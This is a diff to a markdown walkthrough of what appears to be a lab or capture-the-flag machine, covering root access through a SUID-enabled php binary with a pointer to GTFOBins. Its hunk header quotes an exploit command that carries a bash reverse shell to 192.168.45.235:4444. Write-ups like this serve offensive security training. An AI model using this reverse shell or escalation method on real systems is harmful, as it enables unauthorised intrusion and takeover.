@@ -57,12 +57,8 @@ python3 exploit.py -c 'bash -i >& /dev/tcp/192.168.45.235/4444 0>&1' -t http://1
 When enumerating the machine with linpeas we find that on binary /usr/bin/php7.4 the SUID bit is set. If we see that the SUID Bit is set we can look for ways to escalate our privileges on https://gtfobins.github.io/
 
 ![](suid.png)
-```sh
 
-```
 When following the instructions https://gtfobins.github.io/gtfobins/php/#suid we become root!
-```sh
 
-```
 
-![](proof.txt)
+![](proof.png)
